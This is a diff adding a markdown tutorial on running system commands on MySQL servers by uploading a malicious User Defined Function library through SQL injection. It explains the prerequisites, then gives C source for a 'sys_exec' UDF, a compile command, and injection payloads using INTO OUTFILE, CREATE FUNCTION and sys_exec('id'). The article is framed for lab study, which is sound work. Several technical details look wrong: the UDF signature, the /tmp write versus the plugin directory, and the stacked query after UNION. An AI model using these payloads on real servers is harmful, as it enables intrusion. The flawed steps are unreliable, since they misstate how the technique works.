@@ -1,0 +1,105 @@
+---
+title: Execute Commands via MySQL UDF Library
+description: Learn to exploit MySQL User Defined Functions for command execution in a vulnerable environment.
+keywords:
+- MySQL
+- UDF Library
+- command execution
+- user defined functions
+- security vulnerability
+- sys_exec
+- malicious UDF
+- SQL injection
+- FILE privilege
+- secure_file_priv
+---
+
+# COMMAND - UDF Library
+
+## Context
+
+This article explores executing commands on a MySQL server using User Defined Functions (UDF) libraries in a controlled lab environment. The objective is to understand how attackers can exploit misconfigured servers to execute arbitrary commands. Assumes knowledge of SQL injection, UDFs, and command execution techniques.
+
+## Theory
+
+### User Defined Functions (UDF) in MySQL
+
+User Defined Functions (UDFs) are custom functions added to MySQL to extend functionality, implemented as shared libraries linked to the server. Typically used for complex calculations, UDFs can execute system commands if the server lacks proper security (e.g., excessive permissions or file access).
+
+### Vulnerability Model
+
+The risk arises when attackers exploit weak access controls to upload malicious UDF libraries and execute them. This requires specific MySQL privileges (e.g., FILE and CREATE FUNCTION) and write access to server directories, often enabled in poorly secured setups or via chained vulnerabilities like Local File Inclusion (LFI).
+
+### Prerequisites for UDF Exploitation
+
+For successful UDF exploitation, several conditions must be met:
+- **FILE privilege**: Required to read/write files on the server
+- **CREATE FUNCTION privilege**: Needed to register new UDFs
+- **Writable directory**: MySQL must have write access to a directory where it can load shared objects
+- **secure_file_priv configuration**: Must allow file operations to the target directory
+- **SQL injection vulnerability**: To deliver the payload and execute commands
+
+### Command Execution via UDF
+
+To execute commands, an attacker:
+1. Creates a malicious UDF library (e.g., with system() calls)
+2. Uploads it to a server directory MySQL can access via SQL injection
+3. Registers the UDF and invokes it to run commands
+
+## Practice
+
+### Command Execution via UDF Library
+
+This lab demonstrates command execution via UDF in a vulnerable MySQL setup (e.g., Dockerized app with FILE privilege and writable plugin directory). Note: For ethical lab use only; unauthorized access is illegal.
+
+- **Step 1: Write a C program for the malicious UDF (udf.c):**
+
+  ```c
+  #include <stdlib.h>
+
+  int sys_exec(const char *command) {
+      return system(command);
+  }
+  ```
+
+- **Step 2: Compile it into a shared object file:**
+
+  ```bash
+  gcc -shared -o libudf.so -fPIC udf.c
+  ```
+
+- **Step 3: Check MySQL configuration and privileges:**
+
+  ```sql
+  SELECT @@secure_file_priv;
+  SHOW GRANTS FOR CURRENT_USER();
+  ```
+
+- **Step 4: Exploit a vulnerability (e.g., SQL injection with FILE privilege) to write the compiled libudf.so to a MySQL-accessible directory. Example payload for a vulnerable endpoint (`/search.php?q=[INJECT]`) with FILE privilege:**
+
+  ```sql
+  1' UNION SELECT 0x[hex-encoded-libudf.so] INTO OUTFILE '/tmp/libudf.so' --
+  ```
+
+- **Step 5: Create the UDF function, assuming CREATE FUNCTION privilege (often requires compromised admin credentials):**
+
+  ```sql
+  1' UNION SELECT 1; CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'libudf.so' --
+  ```
+
+- **Step 6: Execute a system command via the UDF, using SQL injection:**
+
+  ```sql
+  1' UNION SELECT sys_exec('id') --
+  ```
+
+#### Result
+
+If successful, the UDF executes system commands (e.g., `id` returns user details) on the server. This highlights risks of excessive MySQL privileges and poor file access controls, enabling data manipulation or backdoors.
+
+## Tools
+
+- **gcc**: Compiler for creating shared object files from C code
+- **sqlmap**: Automates SQL injection to exploit FILE privileges and deliver payloads
+- **Burp Suite**: Manual testing for crafting and injecting payloads
+- **hexdump**: Convert binary files to hexadecimal for SQL injection payloads
